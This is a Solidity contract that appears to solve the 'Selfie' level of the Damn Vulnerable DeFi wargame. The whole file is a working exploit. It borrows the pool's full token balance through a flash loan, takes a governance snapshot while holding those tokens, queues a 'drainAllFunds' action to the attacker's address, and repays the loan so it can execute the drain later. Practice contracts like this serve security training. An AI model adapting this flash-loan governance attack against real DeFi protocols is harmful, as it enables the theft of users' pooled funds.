pragma solidity 0.8.17;

import {SimpleGovernance} from "../selfie/SimpleGovernance.sol";
import {ERC20Snapshot} from "openzeppelin-contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import {SelfiePool} from "../selfie/SelfiePool.sol";
import {DamnValuableTokenSnapshot} from "../DamnValuableTokenSnapshot.sol";

contract AttackSelfieContract {
    address _owner;
    SimpleGovernance _governance;
    ERC20Snapshot _token;
    SelfiePool _pool;
    uint256 _snapshotId;

    constructor(address owner, address governance, address token, address pool) {
        _owner = owner;
        _governance = SimpleGovernance(governance);
        _token = ERC20Snapshot(token);
        _pool = SelfiePool(pool);
    }

    function attackQueue() public {
        require(_owner == msg.sender, "not owner");

        uint256 poolBalance = _token.balanceOf(address(_pool));
        _pool.flashLoan(poolBalance);
    }

    function attackExecute() public {
        require(_owner == msg.sender, "not owner");

        _governance.executeAction(_snapshotId);
    }

    function receiveTokens(address token, uint256 amount) external {
        DamnValuableTokenSnapshot(address(_token)).snapshot();
        _snapshotId =
            _governance.queueAction(address(_pool), abi.encodeWithSignature("drainAllFunds(address)", _owner), 0);

        _token.approve(address(_pool), amount);

        _token.transfer(address(_pool), amount);
    }
}
